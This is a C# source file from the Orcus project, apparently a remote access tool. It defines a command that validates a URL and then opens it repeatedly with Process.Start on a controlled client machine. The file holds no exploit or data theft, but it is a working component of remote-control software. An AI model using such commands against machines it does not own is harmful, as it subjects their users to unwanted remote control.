using System;
using System.Diagnostics;
using Orcus.Plugins;
using Orcus.Plugins.PropertyGrid;
using Orcus.Plugins.PropertyGrid.Attributes;
using Orcus.Plugins.StaticCommands;

namespace Orcus.StaticCommands.System
{
    public class OpenWebsiteCommand : StaticCommand
    {
        public OpenWebsiteCommand()
        {
            this.RegisterProperty(() => Url, Resources.StaticCommands.System_OpenWebsiteCommand_WebsiteUrl,
                    Resources.StaticCommands.System_OpenWebsiteCommand_WebsiteUrl_Description,
                    Resources.StaticCommands.Common)
                .RegisterProperty(() => Times, Resources.StaticCommands.System_OpenWebsiteCommand_Amount,
                    Resources.StaticCommands.System_OpenWebsiteCommand_Amount_Description,
                    Resources.StaticCommands.Common);
        }

        public override Guid CommandId { get; } = new Guid(0xc754ad81, 0x1efa, 0x494f, 0x99, 0x79, 0xc1, 0x28, 0x18,
            0x48, 0xbd, 0x51);
        public override string Name { get; } = Resources.StaticCommands.System_OpenWebsiteCommand_Name;
        public override string Description { get; } = Resources.StaticCommands.System_OpenWebsiteCommand_Description;
        public override StaticCommandCategory Category { get; } = StaticCommandCategory.System;

        [NumericValue(Minimum = 1)]
        public int Times { get; set; } = 1;

        public string Url { get; set; }

        public override InputValidationResult ValidateInput()
        {
            Uri outUri;

            if (!Uri.TryCreate(Url, UriKind.Absolute, out outUri) ||
                (outUri.Scheme != Uri.UriSchemeHttp && outUri.Scheme != Uri.UriSchemeHttps))
                return new InputValidationResult(Resources.StaticCommands.System_OpenWebsiteCommand_ValidateInput_InvalidUrl, ValidationState.WarningYesNo);

            if (Times <= 0)
                return InputValidationResult.Error(Resources.StaticCommands.System_OpenWebsiteCommand_ValidateInput_Times);

            return InputValidationResult.Successful;
        }

        public override void Execute(CommandParameter commandParameter, IFeedbackFactory feedbackFactory, IClientInfo clientInfo)
        {
            commandParameter.InitializeProperties(this);

            for (int i = 0; i < Times; i++)
                Process.Start(Url);
        }
    }
}